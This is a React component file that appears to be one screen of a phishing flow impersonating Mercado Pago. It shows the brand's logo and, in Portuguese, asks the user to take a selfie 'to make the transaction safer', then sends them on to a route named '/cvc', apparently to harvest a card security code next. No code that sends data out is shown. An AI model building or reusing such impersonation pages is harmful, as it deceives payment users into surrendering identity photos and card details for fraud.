import React from 'react';
import { Link } from 'react-router-dom';

import Logo from '../../assets/mercado-pago.svg';

import { Container, Topo, Inputs } from './styles';

function Segunda() {
  return (
    <Container>
      <Topo>
        <img src={Logo} alt=""/>
      </Topo>

      <h1>Confirme que é você.</h1>
      <p>Tire uma foto sua. Isso vai nos ajudar tornar a sua transação mais segura.</p>

      <Inputs>
        <input type="file" accept="image/*" capture="camera" />

        <Link to="/cvc"><button>Enviar</button></Link>
      </Inputs>
    </Container>
  );
}

export default Segunda;